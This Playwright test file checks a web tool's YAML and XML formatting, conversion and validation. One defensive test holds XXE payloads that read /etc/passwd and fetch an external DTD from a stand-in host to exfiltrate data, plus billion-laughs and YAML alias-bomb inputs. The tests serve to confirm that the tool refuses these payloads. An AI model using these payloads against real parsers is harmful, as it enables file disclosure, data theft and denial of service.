import { expect, test, type Page } from '@playwright/test';
import { download, grantClipboard, openTool, readClipboard, recordRequests, watchErrors } from './helpers';

const output = (page: Page) => page.locator('#data-output');

test.beforeEach(async ({ page }) => {
  await openTool(page, 'yaml-xml-tools', 'YAML/XML Tools');
});

test('validates and formats YAML, keeping comments, anchors and number spellings', async ({ page }) => {
  const errors = watchErrors(page);
  await page.fill('#data-input', '# settings\nname:   edge\nports: [80,443]\nlimits: &l {rps: 1e3, max: 0x1F}\ncopy: *l\nbig: 12345678901234567890\n');
  await expect(output(page)).toHaveValue('# settings\nname: edge\nports: [ 80, 443 ]\nlimits: &l { rps: 1e3, max: 0x1F }\ncopy: *l\nbig: 12345678901234567890\n');
  await expect(page.locator('#data-status')).toContainText('Valid YAML: 1 document');
  await expect(page.locator('#data-notes')).toContainText('Comments, anchors, tags, quoting and the spelling of numbers are kept.');
  await page.getByRole('radio', { name: '4 spaces' }).check();
  await page.fill('#data-input', 'a:\n  b:\n    - 1\n');
  await expect(output(page)).toHaveValue('a:\n    b:\n        - 1\n');
  expect(errors).toEqual([]);
});

test('reports YAML errors with line and column and jumps to them', async ({ page }) => {
  await page.fill('#data-input', 'a: 1\nb: [1, 2\nc: 3\n');
  await expect(page.locator('#data-status')).toContainText('Invalid YAML');
  await expect(page.locator('#data-errors li').first()).toContainText('Line 3, column 1:');
  await expect(output(page)).toHaveValue('');
  await expect(page.locator('#data-input')).toHaveAttribute('aria-invalid', 'true');
  await expect(page.getByRole('button', { name: 'Copy', exact: true })).toBeDisabled();
  await page.locator('#data-goto').click();
  expect(await page.locator('#data-input').evaluate((el: HTMLTextAreaElement) => el.selectionStart)).toBe(14);
  await page.fill('#data-input', 'a: 1\na: 2\n');
  await expect(page.locator('#data-errors')).toContainText('Map keys must be unique');
});

test('converts YAML to JSON and says what JSON cannot hold', async ({ page }) => {
  await page.selectOption('#data-operation', 'yaml-json');
  await page.fill('#data-input', '# c1\nname: edge # c2\nbig: 12345678901234567890\nratio: 1.50\nhex: 0x1F\nflag: yes\ndate: 2026-11-14\nshared: &s [1, 2]\nagain: *s\n1: one\n');
  await expect(output(page)).toHaveValue('{\n  "name": "edge",\n  "big": 12345678901234567890,\n  "ratio": 1.50,\n  "hex": 31,\n  "flag": "yes",\n  "date": "2026-11-14",\n  "shared": [\n    1,\n    2\n  ],\n  "again": [\n    1,\n    2\n  ],\n  "1": "one"\n}\n');
  const notes = page.locator('#data-notes');
  await expect(notes).toContainText('2 comments not carried over: JSON has no comments.');
  await expect(notes).toContainText('1 alias written out in full');
  await expect(notes).toContainText('1 key that was not a string');
  await expect(notes).toContainText('1 number written in a different form with the same value');
  await expect(notes).toContainText('only true and false are booleans');
  // Several documents become an array, and the result says so.
  await page.fill('#data-input', 'a: 1\n---\n- x\n');
  await expect(output(page)).toHaveValue('[\n  {\n    "a": 1\n  },\n  [\n    "x"\n  ]\n]\n');
  await expect(notes).toContainText('The input has 2 YAML documents');
  // What JSON cannot express is refused, with the place.
  await page.fill('#data-input', 'a: 1\nb: .inf\n');
  await expect(page.locator('#data-errors')).toContainText('Line 2, column 4: Infinity (.inf) has no JSON representation');
  await page.fill('#data-input', '? [1, 2]\n: v\n');
  await expect(page.locator('#data-errors')).toContainText('JSON object names must be strings');
});

test('an alias bomb is stopped by the output limit, not by running out of memory', async ({ page }) => {
  await page.selectOption('#data-operation', 'yaml-json');
  const lines = ['a0: &a0 ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol"]'];
  for (let i = 1; i <= 9; i++) lines.push(`a${i}: &a${i} [${Array(10).fill(`*a${i - 1}`).join(',')}]`);
  const started = Date.now();
  await page.fill('#data-input', `${lines.join('\n')}\n`);
  await expect(page.locator('#data-errors')).toContainText('would be larger than 20,000,000 characters, because aliases repeat the same data many times', { timeout: 20_000 });
  expect(Date.now() - started).toBeLessThan(15_000);
  await expect(output(page)).toHaveValue('');
});

test('converts JSON to YAML with exact numbers and safe quoting', async ({ page }) => {
  await page.selectOption('#data-operation', 'json-yaml');
  await page.fill('#data-input', '{"name":"edge","big":12345678901234567890,"ratio":1.50,"rps":1e3,"flag":"yes","when":"2026-11-14","port":"0123","list":[1,{"a":null}],"empty":{}}');
  await expect(output(page)).toHaveValue('name: edge\nbig: 12345678901234567890\nratio: 1.50\nrps: 1e3\nflag: "yes"\nwhen: "2026-11-14"\nport: "0123"\nlist:\n  - 1\n  - a: null\nempty: {}\n');
  await expect(page.locator('#data-notes')).toContainText('1 number uses an exponent without a decimal point');
  await page.fill('#data-input', '{"a":1,"a":2}');
  await expect(page.locator('#data-errors')).toContainText('YAML mappings must have unique keys');
  await page.fill('#data-input', '{"a":1,}');
  await expect(page.locator('#data-status')).toContainText('Invalid JSON');
  await expect(page.locator('#data-errors')).toContainText('Line 1, column 8:');
  await page.getByRole('radio', { name: 'Tab' }).check();
  await expect(page.locator('#data-tab-note')).toBeVisible();
});

test('validates and formats XML, changing only layout whitespace', async ({ page }) => {
  await page.selectOption('#data-operation', 'xml-format');
  await page.getByRole('button', { name: 'Example' }).click();
  await expect(page.locator('#data-status')).toContainText('Well-formed XML: root <inventory>, 8 elements, 6 attributes, depth 3');
  await expect(output(page)).toHaveValue([
    '<?xml version="1.0" encoding="UTF-8"?>', '<!-- Device inventory -->', '<inventory xmlns:net="urn:example:net">',
    '  <device id="sw1" net:role="core">', '    <name>Core switch</name>', '    <port n="1"/>', '    <port n="2"/>', '  </device>',
    '  <device id="fw1">', '    <name>Edge &amp; DMZ firewall</name>', '    <note><![CDATA[rules < 100]]></note>', '  </device>', '</inventory>', '',
  ].join('\n'));
  await expect(page.locator('#data-notes')).toContainText('Whitespace was changed only between tags inside elements that contain no text.');
  await page.selectOption('#data-operation', 'xml-minify');
  await expect(output(page)).toHaveValue('<?xml version="1.0" encoding="UTF-8"?><!-- Device inventory --><inventory xmlns:net="urn:example:net"><device id="sw1" net:role="core"><name>Core switch</name><port n="1"/><port n="2"/></device><device id="fw1"><name>Edge &amp; DMZ firewall</name><note><![CDATA[rules < 100]]></note></device></inventory>');
  await expect(page.getByRole('radio', { name: '2 spaces' })).toBeHidden();
  // Mixed content is left exactly as written.
  await page.selectOption('#data-operation', 'xml-format');
  await page.fill('#data-input', '<p>Hello <b>big</b>  world</p>');
  await expect(output(page)).toHaveValue('<p>Hello <b>big</b>  world</p>\n');
});

test('reports XML errors with their position', async ({ page }) => {
  await page.selectOption('#data-operation', 'xml-format');
  const cases: [string, string][] = [
    ['<a><b></a>', 'Line 1, column 7: The closing tag </a> does not match the open element <b>'],
    ['<a x=1/>', 'must be in quotes'],
    ['<a x="1" x="2"/>', 'appears more than once'],
    ['<a/><b/>', 'second root element'],
    ['<a>&nbsp;</a>', 'The entity "&nbsp;" is not one XML defines'],
    ['<p:a/>', 'The prefix "p" in <p:a> is not bound to a namespace'],
    ['<a><!-- x -- y --></a>', 'A comment cannot contain "--"'],
    ['<a>', 'is never closed'],
  ];
  for (const [xml, message] of cases) {
    await page.fill('#data-input', xml);
    await expect(page.locator('#data-errors'), xml).toContainText(message);
    await expect(page.locator('#data-status')).toContainText('Invalid XML');
    await expect(output(page)).toHaveValue('');
  }
});

test('external entities and DTDs are never loaded or expanded', async ({ page, context, baseURL }) => {
  const log = await recordRequests(context, new URL(baseURL!).origin);
  await page.selectOption('#data-operation', 'xml-format');
  await page.waitForLoadState('networkidle');
  await page.fill('#data-input', '<a/>');
  await expect(page.locator('#data-status')).toContainText('Well-formed XML');
  const settled = log.all.length;

  const attacks = [
    '<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<r>&xxe;</r>',
    '<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://nf-sentinel.invalid/secret"> ]>\n<r>&xxe;</r>',
    '<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://nf-sentinel.invalid/evil.dtd"> %ext; ]>\n<r>&send;</r>',
    `<?xml version="1.0"?>\n<!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ]>\n<lolz>&lol3;</lolz>`,
  ];
  for (const xml of attacks) {
    await page.fill('#data-input', xml);
    await expect(page.locator('#data-errors')).toContainText('NetForge never expands entities declared in a DOCTYPE');
    await expect(output(page)).toHaveValue('');
  }
  // An external DTD that is named but not used is kept as text and never fetched.
  await page.fill('#data-input', '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://nf-sentinel.invalid/r.dtd">\n<r><a/></r>');
  await expect(page.locator('#data-status')).toContainText('Well-formed XML');
  await expect(page.locator('#data-notes')).toContainText('The DOCTYPE names an external DTD. NetForge does not load it');
  await expect(output(page)).toHaveValue('<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://nf-sentinel.invalid/r.dtd">\n<r>\n  <a/>\n</r>\n');
  await page.selectOption('#data-operation', 'xml-json');
  await expect(output(page)).toHaveValue(/"doctype": "<!DOCTYPE r SYSTEM/);
  await page.waitForTimeout(300);
  expect(log.blockedExternal).toEqual([]);
  expect(log.all.length).toBe(settled);
  expect(log.all.some(r => r.url.includes('nf-sentinel'))).toBe(false);
});

test('converts XML to JSON with the documented model', async ({ page }) => {
  await page.selectOption('#data-operation', 'xml-json');
  await page.fill('#data-input', '<!-- top -->\n<list xmlns="urn:x" xmlns:m="urn:m">\n  <item id="1" m:kind="a">one</item>\n  <item id="2"/>\n  <!-- inner -->\n  <m:note>a &amp; b<br/>c</m:note>\n</list>');
  const json = JSON.parse(await (async () => { await expect(output(page)).not.toHaveValue(''); return output(page).inputValue(); })());
  expect(json).toEqual({
    before: [{ comment: ' top ' }],
    root: {
      name: 'list', namespace: 'urn:x', attributes: { xmlns: 'urn:x', 'xmlns:m': 'urn:m' },
      children: [
        { name: 'item', namespace: 'urn:x', attributes: { id: '1', 'm:kind': 'a' }, children: ['one'] },
        { name: 'item', namespace: 'urn:x', attributes: { id: '2' } },
        { comment: ' inner ' },
        { name: 'm:note', namespace: 'urn:m', children: ['a & b', { name: 'br', namespace: 'urn:x' }, 'c'] },
      ],
    },
  });
  const notes = page.locator('#data-notes');
  await expect(notes).toContainText('Conversion model: an element is an object with "name"');
  await expect(notes).toContainText('5 whitespace-only text nodes between tags left out');
  await expect(notes).toContainText('1 value had entity or character references');
  await page.locator('#data-keep-whitespace').check();
  await expect(output(page)).toHaveValue(/"children": \[\n\s+"\\n  ",/);
  await expect(notes).not.toContainText('whitespace-only text nodes between tags left out');
});

test('copies and downloads the result with a fitting file name', async ({ page, context }) => {
  await grantClipboard(context);
  await page.selectOption('#data-operation', 'yaml-json');
  await page.fill('#data-input', 'a: 1');
  await expect(output(page)).toHaveValue('{\n  "a": 1\n}\n');
  await page.getByRole('button', { name: 'Copy', exact: true }).click();
  expect(await readClipboard(page)).toBe('{\n  "a": 1\n}\n');
  const file = await download(page, () => page.getByRole('button', { name: 'Download' }).click());
  expect(file).toEqual({ name: 'converted.json', text: '{\n  "a": 1\n}\n' });
  await page.selectOption('#data-operation', 'json-yaml');
  await page.fill('#data-input', '{"a":1}');
  await expect(output(page)).toHaveValue('a: 1\n');
  expect((await download(page, () => page.getByRole('button', { name: 'Download' }).click())).name).toBe('converted.yaml');
  await page.getByRole('button', { name: 'Clear' }).click();
  await expect(output(page)).toHaveValue('');
  await expect(page.locator('#data-status')).toBeEmpty();
});

test('large documents are processed off the page thread; oversized ones are refused', async ({ page }) => {
  await page.selectOption('#data-operation', 'xml-format');
  await page.evaluate(() => {
    const w = window as unknown as { nfTicks: number[] };
    w.nfTicks = [];
    setInterval(() => w.nfTicks.push(performance.now()), 50);
  });
  const set = (value: string) => page.locator('#data-input').evaluate((el: HTMLTextAreaElement, v) => {
    el.value = v;
    el.dispatchEvent(new Event('input', { bubbles: true }));
  }, value);
  const rows = Array.from({ length: 40_000 }, (_, i) => `<row id="${i}"><name>host-${i}</name><ip>10.0.${i >> 8}.${i & 255}</ip></row>`).join('');
  await set(`<rows>${rows}</rows>`);
  await expect(page.locator('#data-status')).toContainText('120,001 elements', { timeout: 30_000 });
  expect((await output(page).inputValue()).startsWith('<rows>\n  <row id="0">\n    <name>host-0</name>')).toBe(true);
  await set('x'.repeat(10_000_001));
  await expect(page.locator('#data-errors')).toContainText('the limit is 10,000,000', { timeout: 30_000 });
});
